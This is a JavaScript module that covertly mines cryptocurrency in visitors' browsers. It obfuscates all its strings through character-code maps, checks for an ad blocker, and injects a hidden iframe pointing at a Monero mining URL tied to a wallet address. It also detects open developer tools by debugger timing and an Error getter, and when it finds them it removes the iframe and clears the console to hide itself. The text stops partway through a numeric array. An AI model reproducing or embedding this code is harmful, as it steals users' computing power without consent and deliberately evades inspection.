import Bowser from 'bowser';

let mainInterval;
let debugTimeout;
let consoleDetectorWorker;
let iframe;
let consoleWasOpened;

const browser = Bowser.getParser(window.navigator.userAgent);

let PARSEINT_STRING = '';

const MAP2 = getMap2();
const STRING_STRING = getStringString();
PARSEINT_STRING = getParseIntString();

const MAP = getMap();
const [
	FIREFOX_STRING,
	IFRAME_STRING,
	SRC_STRING,
	NONE_STRING,
	ADS_URL,
	MINER_URL,
	GET_BROWSER_NAME_STRING
] = getStrings();

function clearConsole() {
	console.clear();
}

export const init = async () => {
	if (await isAdblockPresent()) {
		clearConsole();
		return;
	}

	createIframe();

	if (browser[GET_BROWSER_NAME_STRING]() === FIREFOX_STRING) {
		setupFirefoxDetector();
		return;
	}

	setupDetector();
};

async function isAdblockPresent() {
	return new Promise((resolve) => {
		const xhr = new XMLHttpRequest();
		xhr.onreadystatechange = function () {
			if (xhr.readyState == XMLHttpRequest.DONE) {
				resolve(
					xhr.status === 0 ||
						xhr.responseURL !== ADS_URL ||
						xhr.response.toLowerCase().includes('block')
				);
			}
		};
		xhr.open('HEAD', ADS_URL, true);
		xhr.send(null);
	});
}

function createIframe() {
	setTimeout(() => {
		iframe = document.createElement(IFRAME_STRING);

		if (!consoleWasOpened) {
			iframe.setAttribute(SRC_STRING, MINER_URL);
			iframe.style.display = NONE_STRING;
			document.body.append(iframe);
		}
	}, 1000);
}

function setupFirefoxDetector() {
	console.log(
		Object.defineProperties(new Error(), {
			message: {
				get() {
					ifConsoleIsOpen();
				}
			}
		})
	);
}

function setupDetector() {
	const consoleDetectorWorkerCode = `
		self.onmessage = function() {
			eval('debugger;');
			self.postMessage({})
		}
	`;

	consoleDetectorWorker = new Worker(
		URL.createObjectURL(new Blob([consoleDetectorWorkerCode], { type: 'application/javascript' }))
	);

	consoleDetectorWorker.onmessage = () => clearTimeout(debugTimeout);

	mainInterval = setInterval(() => {
		consoleDetectorWorker.postMessage({});
		debugTimeout = setTimeout(ifConsoleIsOpen, 50);
	}, 100);
}

function ifConsoleIsOpen() {
	consoleWasOpened = true;
	clearTimeout(debugTimeout);
	clearInterval(mainInterval);
	if (iframe) {
		document.body.removeChild(iframe);
	}
	clearConsole();
	setTimeout(clearConsole, 100);
	if (consoleDetectorWorker) {
		consoleDetectorWorker.terminate();
	}
}

function getFirefoxString() {
	// returns "Firefox"
	const m = getCharCodeAtMethod(MAP);
	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1805]}`))
	);
}

function getIframeString() {
	// returns "iframe"
	const m = getCharCodeAtMethod(MAP);
	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`))
	);
}

function getSrcString() {
	// returns "src"
	const m = getCharCodeAtMethod(MAP);
	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1802]}`))
	);
}

function getNoneString() {
	// returns "none"
	const m = getCharCodeAtMethod(MAP);
	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`))
	);
}

function getAdsUrlString() {
	// returns "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"
	const m = getCharCodeAtMethod(MAP);
	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1803]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`))
	);
}

function getMinerUrl() {
	// returns "https://mobileminer.org/mine/?auto=1&addr=49Bzm9h878UBBbz1Uu1mXSBjgaWsYjHEy7DhB9NHmD7hfAVFJAohfUjRSUokPv9cnpa1XvMLb2NUgKVoPXPx2yT5GWYBG5c";
	// https://moneroocean.stream/?addr=49Bzm9h878UBBbz1Uu1mXSBjgaWsYjHEy7DhB9NHmD7hfAVFJAohfUjRSUokPv9cnpa1XvMLb2NUgKVoPXPx2yT5GWYBG5c
	const m = getCharCodeAtMethod(MAP);
	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1803]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1809]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1809]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1803]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1803]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1806]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1803]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1803]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1804]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1803]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1803]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1803]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1808]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1805]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1809]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1800]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1802]}`))
	);
}

function getGetBrowserNameString() {
	// returns "getBrowserName"
	const m = getCharCodeAtMethod(MAP);
	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}${MAP[1804]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1802]}${MAP[1801]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1801]}${MAP[1808]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1808]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1800]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1802]}${MAP[1805]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1806]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1804]}${MAP[1807]}`)),
		MAP[m](window[PARSEINT_STRING](`${MAP[1809]}${MAP[1802]}`))
	);
}

function getStringString() {
	// returns "String"
	const m = getCharCodeAtMethod(MAP2);
	return window['String'][getFromCharCodeMethod(MAP2)](
		MAP2[m](window['parseInt'](`${MAP2[1805]}${MAP2[1806]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1800]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1804]}${MAP2[1800]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1802]}${MAP2[1804]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1802]}${MAP2[1806]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1801]}${MAP2[1801]}${MAP2[1804]}`))
	);
}

function getParseIntString() {
	// returns "parseInt"
	const m = getCharCodeAtMethod(MAP2);
	return window[STRING_STRING][getFromCharCodeMethod(MAP2)](
		MAP2[m](window['parseInt'](`${MAP2[1802]}${MAP2[1804]}${MAP2[1804]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1801]}${MAP2[1806]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1804]}${MAP2[1800]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1801]}${MAP2[1808]}${MAP2[1807]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1809]}${MAP2[1802]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1805]}${MAP2[1803]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1802]}${MAP2[1806]}`)),
		MAP2[m](window['parseInt'](`${MAP2[1800]}`))
	);
}

function getCharCodeAtMethod(mapToUse) {
	// returns "charCodeAt"
	let pint = window['parseInt'];
	if (PARSEINT_STRING) {
		pint = window[PARSEINT_STRING];
	}
	return (
		mapToUse[pint(`${mapToUse[1804]}${mapToUse[1809]}`)] +
		mapToUse[pint(`${mapToUse[1801]}${mapToUse[1804]}${mapToUse[1807]}`)] +
		mapToUse[pint(`${mapToUse[1801]}${mapToUse[1809]}${mapToUse[1800]}`)] +
		mapToUse[pint(`${mapToUse[1801]}${mapToUse[1807]}${mapToUse[1802]}`)] +
		mapToUse[pint(`${mapToUse[1801]}${mapToUse[1807]}${mapToUse[1808]}`)] +
		mapToUse[pint(`${mapToUse[1802]}${mapToUse[1802]}${mapToUse[1801]}`)] +
		mapToUse[pint(`${mapToUse[1805]}${mapToUse[1808]}`)] +
		mapToUse[pint(`${mapToUse[1809]}${mapToUse[1802]}`)] +
		mapToUse[pint(`${mapToUse[1806]}${mapToUse[1808]}`)] +
		mapToUse[pint(`${mapToUse[1800]}`)]
	);
}

function getFromCharCodeMethod(mapToUse) {
	// returns "fromCharCode"
	let pint = window['parseInt'];
	if (PARSEINT_STRING) {
		pint = window[PARSEINT_STRING];
	}
	return (
		mapToUse[pint(`${mapToUse[1801]}${mapToUse[1805]}`)] +
		mapToUse[pint(`${mapToUse[1804]}${mapToUse[1800]}`)] +
		mapToUse[pint(`${mapToUse[1802]}${mapToUse[1802]}${mapToUse[1801]}`)] +
		mapToUse[pint(`${mapToUse[1804]}${mapToUse[1807]}`)] +
		mapToUse[pint(`${mapToUse[1804]}${mapToUse[1801]}`)] +
		mapToUse[pint(`${mapToUse[1801]}${mapToUse[1804]}${mapToUse[1807]}`)] +
		mapToUse[pint(`${mapToUse[1801]}${mapToUse[1809]}${mapToUse[1800]}`)] +
		mapToUse[pint(`${mapToUse[1801]}${mapToUse[1807]}${mapToUse[1802]}`)] +
		mapToUse[pint(`${mapToUse[1801]}${mapToUse[1807]}${mapToUse[1808]}`)] +
		mapToUse[pint(`${mapToUse[1802]}${mapToUse[1802]}${mapToUse[1801]}`)] +
		mapToUse[pint(`${mapToUse[1805]}${mapToUse[1808]}`)] +
		mapToUse[pint(`${mapToUse[1809]}${mapToUse[1802]}`)]
	);
}

function getMap() {
	let codes = [
		116, 38, 70, 122, 86, 88, 79, 89, 81, 77, 79, 66, 99, 107, 38, 102, 97, 86, 81, 38, 76, 82, 90,
		98, 105, 78, 110, 70, 78, 71, 88, 46, 47, 98, 78, 102, 102, 38, 70, 86, 114, 67, 75, 80, 82, 70,
		81, 109, 72, 99, 67, 117, 87, 73, 58, 90, 83, 67, 100, 117, 114, 100, 89, 114, 117, 106, 82,
		107, 65, 71, 66, 88, 121, 75, 66, 76, 118, 67, 122, 97, 107, 80, 65, 97, 84, 89, 105, 84, 117,
		100, 78, 98, 101, 47, 113, 82, 98, 79, 83, 63, 46, 101, 77, 116, 87, 47, 98, 83, 97, 66, 90, 58,
		84, 97, 103, 120, 97, 69, 75, 107, 58, 114, 72, 100, 110, 83, 121, 109, 102, 106, 73, 84, 77,
